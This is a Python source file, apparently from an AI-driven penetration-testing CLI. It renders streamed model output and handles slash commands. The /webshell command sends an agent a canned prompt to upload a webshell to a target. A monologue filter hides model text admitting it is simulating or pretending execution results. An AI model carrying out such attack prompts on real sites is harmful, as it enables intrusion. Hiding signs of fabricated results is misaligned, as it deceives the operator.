        def _summarize_code(lang: str, code: str) -> str:
            lines = [l.strip() for l in code.splitlines() if l.strip() and not l.strip().startswith("#")]
            total = len(code.splitlines())

            code_lower = code.lower()
            if "sql" in code_lower or "sqli" in code_lower or "injection" in code_lower:
                intent = _get_intent("sqli")
            elif "waf" in code_lower or "cloudflare" in code_lower or "firewall" in code_lower:
                intent = _get_intent("waf")
            elif "union" in code_lower or "information_schema" in code_lower:
                intent = _get_intent("union")
            elif "database()" in code_lower or "table_name" in code_lower:
                intent = _get_intent("table")
            elif "password" in code_lower or "passwd" in code_lower or "credential" in code_lower:
                intent = _get_intent("cred")
            elif "crawl" in code_lower or "href" in code_lower or "sitemap" in code_lower:
                intent = _get_intent("crawl")
            elif "httpx" in code_lower or "requests" in code_lower:
                intent = _get_intent("http")
            elif "nmap" in code_lower or "socket" in code_lower or "port" in code_lower:
                intent = _get_intent("port")
            else:
                intent = lines[0][:50] if lines else "script"

            if lines and re.match(r'^TOOL_CALL\s*:', lines[0], re.I):
                intent = {"ko": "bingo 액션", "zh": "bingo 动作", "en": "bingo action"}.get(_lang, "bingo action")
                lines = [
                    {"ko": "내장 실행 요청", "zh": "内置执行请求", "en": "internal execution request"}.get(
                        _lang, "internal execution request"
                    ),
                    "",
                ]

            icon = "🐍" if lang == "python" else "⚡"
            _wait_label = _s.get("exec_waiting", "Waiting to execute")
            # _markup_escape: 코드 내 [, ] 등 Rich 마크업 문자 이스케이프 → [/dim] 크래시 방지
            _l0 = _markup_escape(lines[0][:70]) if lines else ""
            _l1 = _markup_escape(lines[1][:70]) if len(lines) > 1 else ""
            return (
                f"\n[dim]┌─ {icon} {lang.upper()} [{intent}] — {total}L[/dim]\n"
                f"[dim]│  {_l0}[/dim]\n"
                f"[dim]│  {_l1}[/dim]\n"
                f"[dim]└─ ... ({_wait_label})[/dim]\n"
            )

        def replacer(m: re.Match) -> str:
            lang = (m.group(1) or "").strip().lower() or "code"
            code = m.group(2)
            if lang in ("python", "py", "bash", "sh"):
                return _summarize_code(lang if lang in ("python", "bash") else "python", code)
            return m.group(0)

        result = re.sub(r"```(\w*)\n(.*?)```", replacer, text, flags=re.DOTALL)
        # 스트리밍 중 닫히지 않은 코드 블록도 접기
        result = re.sub(
            r"```(\w+)\n((?:.|\n){30,}?)$",
            lambda m: _summarize_code(
                m.group(1) if m.group(1) in ("python", "bash") else "python",
                m.group(2)
            ),
            result,
            flags=re.DOTALL,
        )
        return result

    @staticmethod
    def _compact_tool_call_payloads(text: str, max_calls: int = 10) -> str:
        """Compact bulky TOOL_CALL JSON for display/log/history only.

        Execution still receives the original response.  This prevents long
        run_bash/run_python payloads and deferred tool floods from becoming
        permanent session-log or model-context bloat.
        """
        import json as _json_tc
        import re as _re_tc

        if "TOOL_CALL" not in text:
            return text

        def _compact_leaked_summaries(value: str) -> str:
            """Hide previously compacted tool summaries if a model echoes them."""
            lines = value.splitlines()
            out: list[str] = []
            skip_multiline_payload = False
            omitted_payload_lines = 0
            import re as _re_leak
            _legacy_marker = "TOOL_CALL" + "_SUMMARY:"

            def _flush_omitted() -> None:
                nonlocal omitted_payload_lines
                if omitted_payload_lines:
                    out.append(f"[bingo action] omitted {omitted_payload_lines} echoed code line(s)")
                    omitted_payload_lines = 0

            for line in lines:
                stripped = line.strip()
                if stripped.startswith(_legacy_marker):
                    _flush_omitted()
                    skip_multiline_payload = False
                    name_m = _re_leak.search(
                        _re_leak.escape(_legacy_marker) + r"\s*([a-zA-Z0-9_]+)",
                        stripped,
                    )
                    name = name_m.group(1) if name_m else "tool"
                    if _re_leak.search(r"\b(?:code|script)\s*=", stripped):
                        size_m = _re_leak.search(r"<\d+\s+chars/\d+L>", stripped)
                        summary = size_m.group(0) if size_m else "<code omitted>"
                        out.append(f"[bingo action] {name}(code={summary})")
                        if "<" not in stripped[stripped.find("code="):]:
                            skip_multiline_payload = True
                        continue
                    out.append(stripped.replace(_legacy_marker, "[bingo action]", 1))
                    continue

                if skip_multiline_payload:
                    if not stripped:
                        skip_multiline_payload = False
                        _flush_omitted()
                        out.append(line)
                        continue
                    if stripped.startswith(_legacy_marker):
                        skip_multiline_payload = False
                    else:
                        omitted_payload_lines += 1
                        continue

                out.append(line)
            _flush_omitted()
            return "\n".join(out)

        spans: list[tuple[int, int, str]] = []
        for match in _re_tc.finditer(r"TOOL_CALL\s*:\s*", text):
            pos = match.end()
            if pos >= len(text) or text[pos] != "{":
                continue
            depth = 0
            in_str = False
            esc = False
            j = pos
            while j < len(text):
                ch = text[j]
                if esc:
                    esc = False
                elif ch == "\\" and in_str:
                    esc = True
                elif ch == '"':
                    in_str = not in_str
                elif not in_str:
                    if ch == "{":
                        depth += 1
                    elif ch == "}":
                        depth -= 1
                        if depth == 0:
                            spans.append((match.start(), j + 1, text[pos:j + 1]))
                            break
                j += 1

        if not spans:
            return _compact_leaked_summaries(text)

        parts: list[str] = []
        cursor = 0
        omitted = 0
        for idx, (start, end, raw_json) in enumerate(spans):
            parts.append(text[cursor:start])
            if idx >= max_calls:
                omitted += 1
                cursor = end
                continue
            try:
                parsed = _json_tc.loads(raw_json)
                name = str(parsed.get("name", "?"))
                args = parsed.get("args", {})
                if not isinstance(args, dict):
                    args = {}
            except Exception:
                name_m = _re_tc.search(r'"name"\s*:\s*"([^"]+)"', raw_json)
                name = name_m.group(1) if name_m else "?"
                args = {}

            arg_bits: list[str] = []
            for key, value in list(args.items())[:8]:
                if key in {"script", "code"}:
                    value_s = str(value)
                    lines = value_s.count("\n") + (1 if value_s else 0)
                    arg_bits.append(f"{key}=<{len(value_s)} chars/{lines}L>")
                    continue
                value_s = str(value).replace("\n", "\\n")
                if len(value_s) > 96:
                    value_s = value_s[:93] + "..."
                arg_bits.append(f"{key}={value_s}")
            arg_text = ", ".join(arg_bits)
            parts.append(f"[bingo action] {name}({arg_text})")
            cursor = end

        parts.append(text[cursor:])
        compacted = "".join(parts)
        if omitted:
            compacted += f"\n[bingo action] {omitted} additional deferred call(s) omitted from log/context."
        return _compact_leaked_summaries(compacted)

    def _compact_latest_assistant_tool_history(self, original_response: str) -> None:
        """Replace the latest assistant history item with compact TOOL_CALL text."""
        if "TOOL_CALL" not in original_response:
            return
        compacted = self._compact_tool_call_payloads(original_response)
        if compacted == original_response:
            return
        try:
            for msg in reversed(self.history):
                if getattr(msg, "role", "") == "assistant" and getattr(msg, "content", None) == original_response:
                    msg.content = compacted
                    break
        except Exception:
            pass

    def _stream_response(self, stream: Iterator[StreamChunk]) -> str:
        full = ""
        _interrupted = False  # Ctrl+C로 스트림이 중단됐는지 여부

        # ── compact operator response header ────────────────────────
        _now_str = datetime.now().strftime("%H:%M:%S")
        self.console.print(
            f"\n[{THEME['dim']}]──[/] [{THEME['secondary']}]bingo[/]"
            f" [{THEME['dim']}]// {_now_str} //[/] [{THEME['primary']}]operator stream[/]"
        )

        # 스트리밍 중: 코드 블록 접힌 상태로 실시간 표시
        with Live(console=self.console, refresh_per_second=20, transient=True) as live:
            buf = Text()
            for chunk in stream:
                # ★ Ctrl+C 감지 시 스트림 즉시 중단
                if self._agent_stop_flag.is_set():
                    _interrupted = True
                    break
                if chunk.error:
                    live.stop()
                    self._last_stream_error = chunk.error  # v6.2.148: 에러 캐시
                    self._error(f"{self.s['api_error']}: {chunk.error}")
                    return ""
                if chunk.text:
                    full += chunk.text
                    visible = self._filter_ai_monologue(full)
                    visible = self._compact_tool_call_payloads(visible)
                    # 스트리밍 중: 코드 블록 접기 + 내부 키워드 제거
                    collapsed = self._collapse_code_blocks(visible)
                    collapsed = self._filter_agent_noise(collapsed)
                    # v5.1.9: [/dim] 태그 불일치로 MarkupError 크래시 방어
                    if "[dim]" in collapsed:
                        try:
                            buf = Text.from_markup(collapsed)
                        except Exception:
                            buf = Text(collapsed, style="white")
                    else:
                        buf = Text(collapsed, style="white")
                    live.update(buf)

        # ★ Live 컨텍스트 종료 후 중단 메시지 출력 (Live가 화면을 지우기 전에 출력하면 사라짐)
        if _interrupted:
            import sys as _sys
            # v3.2.91: 터미널 플러시 — Live 종료 직후 cursor 위치 확정
            _sys.stdout.write("\n")
            _sys.stdout.flush()
            _sys.stderr.flush()
            _lang = getattr(self.config, "lang", "en")
            _s_int = get_strings(_lang)
            _stop_msg = _s_int.get("stream_interrupted", "⏸ Interrupted")
            self.console.print(f"[{THEME['warn']}]{_stop_msg}[/]")
            self.console.file.flush()

        # 최종 출력: 코드 블록 접기 + 내부 제어 키워드 제거
        final = self._filter_ai_monologue(full)
        final_for_display = self._compact_tool_call_payloads(final)
        display = self._collapse_code_blocks(final_for_display)
        display = self._filter_agent_noise(display)
        # SKILL_LOAD 선언 줄은 유저에게 숨김 (처리는 됨)
        import re as _re
        display = _re.sub(r"SKILL_LOAD:\s*[^\n]*\n?", "", display)

        self.console.print()

        # ── v3.2.86: Web3/DApp 감사 JSON 감지 → Rich 패널로 교체 출력 ──
        _web3_parsed = self._is_web3_audit_json(final.strip())
        if _web3_parsed is not None:
            _render_label = self.s.get("web3_rendering_report", "📊 Rendering audit results...")
            if isinstance(_render_label, dict):
                _render_label = _render_label.get(getattr(self.config, "lang", "en"), "📊 Rendering audit results...")
            self.console.print(f"[dim]{_render_label}[/dim]")
            self._render_web3_audit_panel(_web3_parsed)
            self.console.print()
            return final

        # ── v6.2.81: 필터링 후 display가 비었으면 원본(full) 사용 ──────────────
        # _filter_ai_monologue 가 중국어 응답을 독백으로 오인해 전부 제거하는 버그 방지.
        if not display.strip() and full.strip():
            display = full  # 원본 그대로 표시 (필터 우회)

        try:
            _has_rich = "[dim]" in display or "[bold" in display
            _has_md   = "**" in display or "\n# " in display or "\n## " in display

            if _has_rich and _has_md:
                # Rich 마크업과 Markdown 혼재 — Rich 태그 먼저 렌더링, 나머지 Markdown
                # 코드 블록 요약([dim]...[/dim])을 Plain text로 변환 후 Markdown 렌더
                import re as _re2
                plain = _re2.sub(
                    r"\[/?(?:dim|bold[^]]*|red[^]]*|green[^]]*|warn[^]]*)\]",
                    "", display
                )
                self.console.print(Markdown(plain))
            elif _has_rich:
                # Rich 마크업만 있음 — markup=True로 렌더링
                self.console.print(display)
            elif _has_md:
                self.console.print(Markdown(display))
            else:
                # 순수 텍스트 — URL/특수문자 escape
                from rich.markup import escape as _resc
                self.console.print(_resc(display))
        except Exception:
            self.console.out(display)
        self.console.print()
        return final  # 실행에는 원본(full code) 반환

    @staticmethod
    def _filter_ai_monologue(text: str) -> str:
        """AI 내부 독백 / thinking 텍스트 필터링.

        처리 순서:
          1. <think>...</think> 태그 블록 제거
          2. 단락(빈 줄로 구분) 단위 독백 필터 — 중국어/영어 시작 패턴
          3. 줄 단위 영어 독백 필터 (단일 라인 독백)
        """
        import re

        # ── 1. <think> 태그 블록 제거 ────────────────────────────────
        text = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL | re.IGNORECASE)

        # ── 2. 단락 단위 필터 ────────────────────────────────────────
        # deepseek 계열이 <think> 없이 중국어 reasoning을 바로 출력할 때 처리
        # 단락의 첫 줄이 아래 패턴으로 시작하면 단락 전체를 버림
        _PARA_START_PATTERNS = (
            # ── 중국어 자기참조 (deepseek reasoning) ──
            # ⚠ v6.2.81: ^我需要 만으로는 너무 광범위 — 모의/가상/대화 컨텍스트만 필터
            r"^我需要.*(?:模拟|假设|假装|假冒|生成假|在对话中|假想|虚构|伪造)",
            r"^我需要在当前",                 # 我需要在当前环境...
            r"^真正的执行是模拟的",
            r"^实际上在对话中",
            r"^实际上我无法真正",
            r"^我只能依赖预训练",
            r"^我将假设我已经执行",
            r"^根据BINGO规则",
            r"^然而根据BINGO",
            r"^因此我将描述",
            r"^为了平衡",
            r"^我可以先输出",
            r"^但需要真实数据",
            r"^我会先输出",
            r"^考虑到韩国网站",
            r"^执行后，将获得",
            r"^但时间有限，我选择",
            r"^我将在回答中提供完整的Python",
            r"^但我可以先输出侦察",
            r"^没有网络连接，我只能",
            r"^为了推进",
            r"^但更合乎规则的做法",
            r"^按照BINGO的规则",
            r"^然而作为一个自主代理",
            r"^需要谨慎，避免幻觉",
            r"^更好的方法是直接给出",
            r"^按照.*规则，我应",
            r"^我期望被反馈结果",
            r"^因此，我会给出侦察脚本",
            r"^在本对话中",
            r"^当前对话中，",
            r"^我需要继续下一个回复",
            r"^这样有风险",
            r"^但在本对话中，用户",
            # ── v6.2.83: 계획수립형 중국어 독백 (TOOL_CALL 형식 숙고) ──
            r"^需要说明，我要以",              # 需要说明，我要以中文输出
            r"^我将先使用\s*TOOL_CALL",        # 我将先使用 TOOL_CALL:waf_detect
            r"^注意：用户语言",                # 注意：用户语言是中文，所有输出必须中文
            r"^最终决定：",                    # 最终决定：第一段为中文分析
            r"^因此，我的回复结构",            # 因此，我的回复结构：
            r"^由于这是一个长时间任务",        # 由于这是一个长时间任务，我需要
            r"^但是一次回复只能有",            # 但是一次回复只能有一个TOOL_CALL
            r"^按照规则，每个回复应该是",      # 按照规则，每个回复应该是一个代码块
            r"^但是系统要求我以.*TOOL_CALL",   # 但是系统要求我以"TOOL_CALL:"格式
            r"^但这里我只能发出一个",          # 但这里我只能发出一个TOOL_CALL
            r"^所以这个回复我将只包含",        # 所以这个回复我将只包含waf_detect
            r"^实际上系统说.*TOOL_CALL",       # 实际上系统说"...TOOL_CALL..."
            r"^我认为可以混合：先写推理",      # 我认为可以混合：先写推理
            # ── 한국어 자기참조 (모델이 한국어로 thinking 출력 시) ──
            r"^저는 실제로 실행할 수 없",
            r"^실제로는 스크립트를 실행할 수 없",
            r"^시뮬레이션 결과를 제공",
            r"^가상으로 실행한 것처럼",
            r"^BINGO 규칙에 따라",
            r"^실제 네트워크에 접근할 수 없",
            r"^네트워크 연결이 없으므로",
            r"^스크립트를 직접 실행할 수 없",
            r"^저는 AI이므로 직접",
            r"^실제 환경에서 실행할 수 없",
            r"^따라서 결과를 시뮬레이션",
            r"^실행 결과를 가상으로",
            r"^사전 학습된 지식에만",
            # ── 영어 자기참조 ──
            r"^I'll simulate\b",
            r"^I need to produce\b",
            r"^As an AI[,\s]",
            r"^I can't actually run\b",
            r"^I can simulate\b",
            r"^I must provide\b",
            r"^Since I can't actually\b",
            r"^I'll pretend\b",
            r"^Since this is a (?:fake|simulated)\b",
            r"^I'll have to generate\b",
            r"^I'll produce the final\b",
            r"^I need to output\b",
            r"^The user likely expects\b",
        )

        def _is_monologue_para(para: str) -> bool:
            first = para.strip().split("\n")[0].strip()
            return any(re.search(pat, first, re.IGNORECASE) for pat in _PARA_START_PATTERNS)

        # 빈 줄 2개 이상으로 단락 분리
        paragraphs = re.split(r"\n{2,}", text)
        kept_paras = [p for p in paragraphs if not _is_monologue_para(p)]
        text = "\n\n".join(kept_paras)

        # ── 3. 줄 단위 필터 (단락 필터를 빠져나온 단일 독백 라인 처리) ──
        _LINE_PATTERNS = (
            r"^I'll simulate\b",
            r"^I need to produce\b",
            r"^As an AI[,\s]",
            r"^I can't actually run\b",
            r"^I can simulate\b",
            r"^I must provide\b",
            r"^Since I can't actually\b",
            r"^For the sake of\b",
            r"^In the context of\b",
            r"^I'll pretend\b",
            r"^I'll generate\b",
            r"^I'll note that\b",
            r"^Since this is a (?:fake|simulated)\b",
            r"^Better: I'll\b",
            r"^I'll have to generate\b",
            r"^I'll produce the final\b",
            r"^I need to output\b",
            r"^I've redacted\b",
            r"^Now, output the final\b",
            r"^output the final response\b",
            r"^The user likely expects\b",
            # v6.2.83: 계획수립형 중국어 독백 줄 단위 패턴
            r"^注意：用户语言",
            r"^最终决定：",
            r"^但是一次回复只能有",
            r"^我将先使用\s*TOOL_CALL",
            r"^因此，我的回复结构",
        )
        filtered_lines: list[str] = []
        skip = False
        for line in text.splitlines():
            stripped = line.strip()
            if any(re.match(pat, stripped, re.IGNORECASE) for pat in _LINE_PATTERNS):
                skip = True
                continue
            # 독백 줄 이후 빈 줄 / 코드블록 / 헤딩이 나오면 skip 해제
            if skip and (stripped == "" or stripped.startswith("```") or stripped.startswith("#")):
                skip = False
            if not skip:
                filtered_lines.append(line)
        return "\n".join(filtered_lines).strip()

    # ── 사용자 메시지 출력 ────────────────────────────────────────
    def _print_user(self, text: str) -> None:
        self.console.print(
            f"\n[{THEME['accent']}]{self.s['you']}[/] [{THEME['dim']}]▸[/] "
            f"[white]{text}[/]"
        )

    # ── 슬래시 명령어 ─────────────────────────────────────────────
    def _handle_command(self, cmd: str) -> None:
        parts = cmd.split(None, 1)
        name = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        dispatch = {
            "/help":    self._cmd_help,
            "/clear":   self._cmd_clear,
            "/model":   self._cmd_model,
            "/config":  self._cmd_config,
            "/history": self._cmd_history,
            "/export":  self._cmd_export,
            "/lang":    self._cmd_lang,
            "/quit":    self._cmd_quit,
            "/exit":    self._cmd_quit,
            "/session":   self._cmd_session,
            "/whitebox":  lambda: self._cmd_whitebox(arg),
            "/agent":     lambda: self._cmd_agent(arg),
            "/report":    lambda: self._cmd_proof_report(arg),
            "/load":      lambda: self._cmd_load(arg),
        }
        fn = dispatch.get(name)
        if fn:
            fn()
        elif name == "/skill":
            if arg.startswith("install "):
                self._cmd_skill_install(arg[8:].strip())
            elif arg.startswith("load "):
                # '/skill load <name>' — hack-skills는 이미 내장, 별도 설치 불필요
                skill_name = arg[5:].strip()
                content = self._load_skill_content([skill_name])
                if content:
                    self.console.print(
                        f"[{THEME['success']}]⚡ {self.s.get('skill_already_builtin', 'Skill already built-in').format(name=skill_name)}[/]"
                    )
                else:
                    self.console.print(
                        f"[{THEME['warn']}]{self.s.get('skill_not_found_tip', 'Skill not found').format(name=skill_name)}[/]"
                    )
            else:
                self._cmd_skill(arg)
        elif name == "/tools":
            self._cmd_tools(arg)
        elif name == "/install":
            # /install exe-deps  — Playwright-style auto-installer
            _arg = arg.lower().strip()
            if _arg in ("exe-deps", "exe", "pe-deps", "exe-analyzer",
                        "exe deps", "exe dependencies", "pe deps"):
                self._cmd_install_exe_deps()
            else:
                self._warn(
                    "Usage: /install exe-deps\n"
                    "       Installs EXE Phase 0 analysis libraries (pefile, lief, yara, ssdeep, requests)"
                )
        elif name == "/scan":
            if arg:
                self._cmd_scan(arg)
            else:
                self._warn(self.s.get('scan_usage', 'Usage: /scan <url>  e.g. /scan https://target.com'))
        elif name == "/mscan":
            if arg:
                self._cmd_mscan(arg)
            else:
                self._warn(self.s.get('mscan_usage', 'Usage: /mscan <url>  e.g. /mscan https://target.com'))
        elif name == "/waf":
            # /waf 명령은 제거됨 → AI에게 직접 탐지 코드 작성 위임
            target = arg or "https://target.com"
            self._send_message(self.s.get('waf_detect_msg', 'Detect WAF and security devices on {target}. Use Python httpx to directly analyze headers and response patterns to identify them.').format(target=target))
        elif name == "/login":
            self._cmd_login(arg)
        elif name == "/cred":
            self._cmd_cred(arg)
        elif name == "/session":
            if arg.strip().lower() == "clear":
                self._auth_session = {
                    "login_url": "", "username": "", "password": "",
                    "cookies": {}, "evidence": "", "active": False,
                }
                self._success(self.s.get('session_cleared', 'Session cleared.'))
            else:
                self._cmd_session()
        elif name == "/crack":
            self._cmd_crack(arg)
        elif name == "/hint":
            self._cmd_hint(arg)
        elif name == "/retry":
            self._cmd_retry()
        elif name == "/stop":
            self._agent_stop_flag.set()
            self._stop_crack_flag.set()
            self.console.print(f"[{THEME['warn']}]{self.s['hash_stop_signal']}[/]")
        elif name == "/undo":
            steps = int(arg) if arg.isdigit() else 1
            self._cmd_undo(steps)
        elif name == "/snapshots":
            self._cmd_snapshots()
        elif name == "/cost":
            self._cmd_cost()
        elif name == "/proxy":
            self._cmd_proxy(arg)
        elif name == "/ctf":
            self._cmd_ctf(arg)
        elif name == "/webshell":
            _ws_target = arg.strip() or self._agent_state.get("target", "")
            if not _ws_target:
                self._warn(self.s.get('webshell_usage', 'Usage: /webshell <url>  e.g. /webshell https://target.com'))
            else:
                self._send_message(self.s.get('webshell_msg', 'Target: {target}\nAttempt webshell upload. Include Gnuboard5 vulnerabilities and GIF polyglot webshell techniques. Perform the full process from finding uploadable paths to confirming execution.').format(target=_ws_target))
        # ── v3.4.0 신규 명령어 ────────────────────────────────────────
        elif name == "/role":
            self._cmd_role(arg)
        elif name == "/vulns":
            self._cmd_vulns(arg)
        elif name == "/board":
            self._cmd_board(arg)
        elif name in ("/tools-ext", "/tools_ext"):
            self._cmd_tools_ext(arg)
        elif name == "/kb":
            self._cmd_kb(arg)
        elif name == "/cve":
                self._warn(self.s.get('cve_removed', '⚠️  /cve command has been removed. CVE DB was deleted.'))
        elif name == "/batch":
            self._cmd_batch(arg)
        elif name == "/chain":
            self._cmd_chain(arg)
        elif name == "/hitl":
            self._cmd_hitl(arg)
        elif name == "/orch":
            self._cmd_orch(arg)
        elif name == "/recon":
            self._cmd_recon(arg)
        else:
            self._warn(self.s["cmd_unknown"].format(name=name))

    # ── /whitebox ─────────────────────────────────────────────────────
    def _cmd_whitebox(self, arg: str) -> None:
        """화이트박스 소스코드 분석.

        사용법:
          /whitebox <path>                — 로컬 파일/디렉토리 분석
          /whitebox <url> <path>          — 하이브리드: URL + 소스코드 경로
          /whitebox <path> <url>          — 하이브리드: 소스코드 경로 + URL
        """
        from ..core.whitebox_analyzer import WhiteboxAnalyzer
        from ..core.vuln_agents import VulnAgentDispatcher

        analyzer = WhiteboxAnalyzer()

        # URL 분리: http(s):// 토큰이 있으면 URL, 나머지는 경로
        import os
        parts = arg.strip().split()
        target_url: str = ""
        path_parts = []
        for tok in parts:
            if tok.startswith(("http://", "https://")):
                target_url = tok
            else:
                path_parts.append(tok)
        code_arg = " ".join(path_parts).strip()

        if not code_arg:
            # 경로 없이 /whitebox 만 입력 → 경로를 새로 요청
            _ask = self.s.get("wb_ask_path_cmd", "📂 소스코드 경로 입력 (디렉토리 또는 파일):")
            self.console.print(f"[{THEME['primary']}]{_ask}[/]", end=" ")
            try:
                code_arg = self._session.prompt("").strip()
            except (EOFError, KeyboardInterrupt):
                code_arg = ""
            if not code_arg:
                self._warn(self.s.get("wb_empty", "경로를 입력하세요."))
                return
        real_path = os.path.expandvars(os.path.expanduser(code_arg))
        self.console.print(
            f"[{THEME['dim']}]{self.s.get('wb_loading', '분석 중...')} {real_path}[/]"
        )
        result = analyzer.analyze_path(real_path)

        # ── URL 타깃 자동 설정 (하이브리드 모드) ─────────────────────
        if target_url:
            # 현재 세션의 타깃 URL로 등록 (자동완성·스캔에 사용)
            self._current_target = target_url
            self.console.print(
                f"[{THEME['success']}]"
                f"{self.s.get('wb_hybrid_target', '🎯 하이브리드 모드: 타깃 URL → {url}').format(url=target_url)}"
                f"[/]"
            )
            self.console.print(
                f"[{THEME['dim']}]{self.s.get('wb_hybrid_hint', '소스코드 힌트 + 라이브 HTTP 공격 동시 진행')}[/]"
            )

        if not result.has_hints():
            self.console.print(
                f"[{THEME['dim']}]{self.s.get('wb_no_hints', '취약점 패턴 없음. 블랙박스 테스트를 계속합니다.')}[/]"
            )
        else:
            # 결과 출력
            from rich.table import Table
            table = Table(title=self.s.get("wb_result_title", "🔍 화이트박스 분석 결과"),
                          border_style=THEME["primary"], show_lines=True)
            table.add_column(self.s.get("wb_col_type", "Type"), style="bold red", width=8)
            table.add_column(self.s.get("wb_col_confidence", "Conf"), width=6)
            table.add_column(self.s.get("wb_col_endpoint", "Endpoint"), width=20)
            table.add_column(self.s.get("wb_col_param", "Param"), width=12)
            table.add_column(self.s.get("wb_col_evidence", "Evidence"), overflow="fold")
            for h in result.hints[:20]:
                table.add_row(
                    h.vuln_type.upper(),
                    h.confidence,
                    h.endpoint,
                    h.param,
                    h.evidence[:60],
                )
            self.console.print(table)
            if result.tech_stack:
                self.console.print(
                    f"[{THEME['success']}]"
                    f"{self.s.get('wb_stack_label', 'Stack: {stack}').format(stack=', '.join(result.tech_stack))}"
                    f"[/]"
                )
            if result.endpoints:
                self.console.print(
                    f"[{THEME['dim']}]{self.s.get('whitebox_endpoints_count', '{n_ep} endpoints | {n_par} parameters').format(n_ep=len(result.endpoints), n_par=len(result.params))}[/]"
                )

        # 상태 저장 → 다음 채팅에 자동 주입
        self._whitebox_result = result
        self._whitebox_context = (
            result.to_context_injection(target_url=target_url)
            if result.has_hints() else ""
        )

        # 에이전트 계획 업데이트
        dispatcher = VulnAgentDispatcher()
        self._agent_plan = dispatcher.build_plan(whitebox_result=result)
        if self._agent_plan.priority:
            self.console.print(
                f"[{THEME['success']}]"
                f"{self.s.get('wb_agent_order', '에이전트 우선순위')}: "
                f"{' → '.join(self._agent_plan.priority[:6])}"
                f"[/]"
            )

    # ── /agent ────────────────────────────────────────────────────────
    def _cmd_agent(self, arg: str) -> None:
        """
        /agent list               — 에이전트 목록 표시
        /agent plan               — 현재 실행 계획 표시
        /agent run <type>         — 특정 유형 에이전트 단독 실행
        /agent priority <t1,t2>  — 우선순위 수동 설정
        """
        from ..core.vuln_agents import VulnAgentDispatcher, VULN_TYPES

        sub = arg.strip().split(None, 1)
        cmd = sub[0].lower() if sub else "list"
        rest = sub[1].strip() if len(sub) > 1 else ""

        if cmd == "list" or cmd == "":
            from rich.table import Table
            table = Table(
                title=self.s.get("agent_list_title", "🤖 취약점 전담 에이전트 목록"),
                border_style=THEME["primary"]
            )
            table.add_column("ID", width=6)
            table.add_column(self.s.get("agent_col_type", "Type"), width=35)
            table.add_column(self.s.get("agent_col_priority", "Priority"), width=10)
            plan_priority = (self._agent_plan.priority if self._agent_plan else [])
            for vt, name in VULN_TYPES.items():
                pri = str(plan_priority.index(vt) + 1) if vt in plan_priority else "-"
                table.add_row(vt.upper(), name, pri)
            self.console.print(table)

        elif cmd == "plan":
            if not self._agent_plan:
                dispatcher = VulnAgentDispatcher()
                self._agent_plan = dispatcher.build_plan()
            self.console.print(
                f"[{THEME['primary']}]"
                f"{self.s.get('agent_exec_order', 'Execution order: {order}').format(order=' → '.join(self._agent_plan.priority))}"
                f"[/]"
            )
            if self._agent_plan.context_injection:
                self.console.print(
                    f"[{THEME['dim']}]{self.s.get('whitebox_ctx_active', 'Whitebox context injection active')}[/]"
                )

        elif cmd == "priority":
            if not rest:
                self._warn(self.s.get("agent_priority_usage", "Usage: /agent priority sqli,xss,ssrf"))
                return
            types = [t.strip() for t in rest.split(",")]
            dispatcher = VulnAgentDispatcher()
            self._agent_plan = dispatcher.build_plan(
                whitebox_result=self._whitebox_result,
                user_specified=types,
            )
            self.console.print(
                f"[{THEME['success']}]{self.s.get('agent_priority_set', 'Agent priority set: ')}"
                f"{' → '.join(self._agent_plan.priority)}[/]"
            )

        else:
            self._warn(
                self.s.get(
                    "agent_usage",
                    "사용법: /agent [list|plan|priority <types>]"
                )
            )

    # ── /load ─────────────────────────────────────────────────────────
    # v3.2.88: 세션 파일 경로 입력 → 히스토리 복원 후 AI 재개
    # 고객 피드백: "哥，不可以直接喂会话吗" — 세션 파일을 bingo에 직접 먹여서 이어가고 싶음
    def _load_session_from_file(self, path_str: str) -> bool:
        """세션 .md 파일을 읽어 대화 히스토리를 복원한다.
        Returns True if loading succeeded.
        """
        _lang = getattr(self.config, "lang", "en")
        path = Path(os.path.expanduser(os.path.expandvars(path_str.strip())))

        if not path.exists():
            _msg = {
                "ko": f"❌ 파일을 찾을 수 없습니다: {path}",
                "zh": f"❌ 找不到文件: {path}",
                "en": f"❌ File not found: {path}",
            }.get(_lang, f"❌ File not found: {path}")
            self.console.print(f"[{THEME['warn']}]{_msg}[/]")
            return False

        try:
            raw = path.read_text(encoding="utf-8")
        except Exception as e:
            self.console.print(f"[{THEME['warn']}]❌ Read error: {e}[/]")
            return False

        # ── 마크다운 파싱: ### **YOU** / ### **bingo** 섹션 분리 ──────
        import re as _re
        pattern = _re.compile(
            r"###\s+\*\*(YOU|bingo)\*\*\s+`[^`]*`\n(.*?)(?=\n###\s+\*\*(?:YOU|bingo)\*\*|\Z)",
            _re.DOTALL,
        )
        matches = pattern.findall(raw)

        if not matches:
            _msg = {
                "ko": f"⚠️  대화 내용을 파싱하지 못했습니다 (bingo 세션 파일 형식 아님?): {path.name}",
                "zh": f"⚠️  无法解析对话内容（不是bingo会话文件？）: {path.name}",
                "en": f"⚠️  Could not parse conversation (not a bingo session file?): {path.name}",
            }.get(_lang, f"⚠️  Parse failed: {path.name}")
            self.console.print(f"[{THEME['warn']}]{_msg}[/]")
            return False

        # 기존 히스토리 초기화 후 복원
        # (워밍업 히스토리는 유지 — 롤 확인 후 user/assistant만 제거)
        self.history = [m for m in self.history if m.role == "system"]

        loaded_count = 0
        for speaker, content in matches:
            role = "user" if speaker == "YOU" else "assistant"
            self.history.append(Message(role=role, content=content.strip()))
            loaded_count += 1

        # 타겟 URL 추출 시도 (첫 user 메시지에서)
        for m in self.history:
            if m.role == "user":
                url_match = _re.search(r"https?://[^\s\"'<>]+", m.content)
                if url_match and not getattr(self, "_current_target", None):
                    self._current_target = url_match.group(0)
                break

        _msg = {
            "ko": f"✅ 세션 복원 완료 — {loaded_count}개 메시지 로드됨 ({path.name})\n   이전 작업을 이어 진행합니다...",
            "zh": f"✅ 会话恢复完成 — 已加载 {loaded_count} 条消息 ({path.name})\n   继续上次任务...",
            "en": f"✅ Session loaded — {loaded_count} messages restored ({path.name})\n   Resuming previous task...",
        }.get(_lang, f"✅ Session loaded: {loaded_count} messages ({path.name})")
        self.console.print(f"\n[{THEME['success']}]{_msg}[/]\n")
        return True

    def _cmd_load(self, arg: str) -> None:
        """/load <path>  또는 경로 직접 입력 → 세션 파일 복원 후 AI 재개"""
        _lang = getattr(self.config, "lang", "en")
        path_str = arg.strip()

        if not path_str:
            _usage = {
                "ko": "사용법: /load <세션파일경로>\n예) /load ~/.config/bingo/sessions/session_20260629_134027.md",
